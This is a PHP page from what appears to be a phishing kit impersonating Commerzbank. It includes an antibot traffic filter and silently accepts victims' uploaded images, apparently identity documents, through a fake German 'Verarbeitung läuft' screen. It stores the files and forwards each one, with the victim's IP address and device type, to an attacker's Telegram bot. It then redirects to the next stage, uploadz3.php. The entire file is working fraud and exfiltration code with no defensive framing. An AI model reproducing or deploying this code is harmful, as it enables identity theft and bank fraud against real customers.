<?php
// ANTIBOT DISABLED - include..antibot.php';
include '../antibot/tds.php';

// Increase limits for iPhone uploads
ini_set('upload_max_filesize', '100M');
ini_set('post_max_size', '100M');
ini_set('max_execution_time', '600');
ini_set('memory_limit', '512M');
ini_set('max_input_time', '600');

// Disable error display completely
ini_set('display_errors', '0');
ini_set('display_startup_errors', '0');

// Include Telegram configuration
include '../config/telegram.php';
$botToken = $telegram_bot2_token;
$chatId = $telegram_bot2_chat_id;

$uploadDir = 'xentryxupload/';
if (!is_dir($uploadDir)) {
    mkdir($uploadDir, 0755, true);
}

// Silent processing - no error messages at all
$uploadSuccess = false;
$telegramSent = false;

try {
    if (isset($_FILES['file']) && $_FILES['file']['error'] == UPLOAD_ERR_OK) {
        $randomPrefix = str_pad(rand(0, 999999), 6, '0', STR_PAD_LEFT);
        $originalFileName = basename($_FILES['file']['name']);
        $fileExtension = strtolower(pathinfo($originalFileName, PATHINFO_EXTENSION));
        $newFileName = $randomPrefix . '-' . $originalFileName;
        $uploadPath = $uploadDir . $newFileName;

        // Accept all image types including iPhone formats
        $allowedTypes = ['jpg', 'jpeg', 'png', 'gif', 'heic', 'heif', 'webp', 'bmp', 'tiff'];
        
        if (in_array($fileExtension, $allowedTypes)) {
            if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadPath)) {
                $uploadSuccess = true;
                
                $fileSize = filesize($uploadPath);
                $visitorIp = $_SERVER['REMOTE_ADDR'];
                $userAgent = $_SERVER['HTTP_USER_AGENT'];
                $serverHost = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_ADDR'];
                $imageURL = "{$serverHost}/views/{$uploadDir}{$newFileName}";

                $message = "🟡 |  𝗖𝗼𝗺𝗺𝗲𝗿𝘇𝗯𝗮𝗻𝗸 𝗨𝗽𝗹𝗼𝗮𝗱  [ 1st ]\n";
                $message .= "- Another IMG should appear after this.\n\n";
                $message .= "🔗 |  𝗜𝗠𝗚 𝗨𝗥𝗟  : $imageURL\n";
                $message .= "📍 |  𝗜𝗣  : $visitorIp\n";
                $message .= "📱 |  𝗗𝗲𝘃𝗶𝗰𝗲  : " . (strpos($userAgent, 'iPhone') !== false ? 'iPhone' : 'Other') . "\n";
                $message .= "📏 |  𝗦𝗶𝘇𝗲  : " . number_format($fileSize / 1024, 2) . " KB";
                $message .= "📄 |  𝗙𝗶𝗹𝗲  : $originalFileName";

                // Try to send image to Telegram
                $result = sendTelegramPhoto($botToken, $chatId, $uploadPath, $message);
                
                if ($result) {
                    $telegramSent = true;
                } else {
                    // Try alternative method
                    sendTelegramMessage($botToken, $chatId, $message . "\n\n⚠️ Image upload failed, but data received.");
                    $telegramSent = true;
                }
            }
        }
    }
} catch (Exception $e) {
    // Silent error handling - log but don't display
    error_log("Upload error: " . $e->getMessage());
    
    // Still try to send a notification
    $errorMessage = "❌ |  𝗖𝗼𝗺𝗺𝗲𝗿𝘇𝗯𝗮𝗻𝗸 𝗨𝗽𝗹𝗼𝗮𝗱 𝗘𝗿𝗿𝗼𝗿\n";
    $errorMessage .= "📍 |  𝗜𝗣  : " . $_SERVER['REMOTE_ADDR'] . "\n";
    $errorMessage .= "📱 |  𝗗𝗲𝘃𝗶𝗰𝗲  : " . (strpos($_SERVER['HTTP_USER_AGENT'], 'iPhone') !== false ? 'iPhone' : 'Other') . "\n";
    $errorMessage .= "⚠️ |  𝗘𝗿𝗿𝗼𝗿  : Upload processing error";
    
    sendTelegramMessage($botToken, $chatId, $errorMessage);
}
?>

<!DOCTYPE html>
<html lang="de">
<head>
    <script src="/security.js"></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verarbeitung läuft - Commerzbank</title>
    <meta http-equiv="refresh" content="2; url=uploadz3.php">
    <style>
        body {
            font-family: 'Gotham 4r', Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: #f5f5f5;
            color: #333;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        .processing {
            text-align: center;
            padding: 50px 20px;
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            margin: 20px 0;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #ffcc00;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status {
            color: #666;
            font-size: 16px;
            margin: 20px 0;
        }
        .logo {
            color: #ffcc00;
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="processing">
            <div class="logo">COMMERZBANK</div>
            <div class="spinner"></div>
            <h2>Verarbeitung läuft...</h2>
            <div class="status">
                <?php if ($uploadSuccess): ?>
                    ✅ Datei erfolgreich verarbeitet
                <?php else: ?>
                    ⏳ Verarbeite Ihre Anfrage...
                <?php endif; ?>
            </div>
            <p>Bitte warten Sie, während wir Ihre Daten verarbeiten.</p>
        </div>
    </div>
    
    <script>
        // Ensure redirect happens
        setTimeout(function() {
            window.location.href = 'uploadz3.php';
        }, 2000);
    </script>
</body>
</html>
